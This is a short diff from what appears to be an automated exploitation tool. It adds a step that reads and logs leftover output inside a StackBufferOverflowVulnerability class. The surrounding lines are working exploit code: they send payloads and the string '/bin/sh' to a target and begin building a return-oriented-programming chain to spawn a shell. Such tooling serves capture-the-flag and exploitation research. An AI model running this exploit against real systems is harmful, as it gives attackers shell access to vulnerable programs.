@@ -133,6 +133,11 @@ class StackBufferOverflowVulnerability(Vulnerability):
         conn.sendline(payload2)
         conn.sendline("/bin/sh\x00")
 
+        # TODO: This isn't strictly necesary, and
+        # would be better to detect via a model.
+        res = conn.recv(timeout=1)
+        logger.debug(f"clearing out any re-entry text: {res}")
+
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
         sm.pop_rdi(self.binary.bss()+0x100)
